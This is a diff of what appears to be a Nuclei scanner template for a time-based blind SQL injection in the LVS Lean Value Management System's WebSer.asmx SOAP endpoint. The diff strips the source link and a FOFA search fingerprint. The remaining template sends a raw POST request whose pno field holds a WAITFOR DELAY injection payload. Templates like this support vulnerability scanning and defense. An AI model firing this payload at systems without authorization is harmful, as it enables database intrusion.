@@ -3,14 +3,8 @@ info:
   name: LVS精益价值管理系统 WebSer.asmx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xh9d8vekgo8pfrdz
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xh9d8vekgo8pfrdz
-    fofa: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
 http:
 - raw:
   - "POST /WebSer.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/OutStore\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Header>\n    <AuthenticationHeader xmlns=\"http://tempuri.org/\">\n      <UserName></UserName>\n      <Password></Password>\n    </AuthenticationHeader>\n  </soap:Header>\n  <soap:Body>\n    <OutStore xmlns=\"http://tempuri.org/\">\n      <pno>1';WAITFOR DELAY '0:0:5'--</pno>\n    </OutStore>\n  </soap:Body>\n</soap:Envelope>"
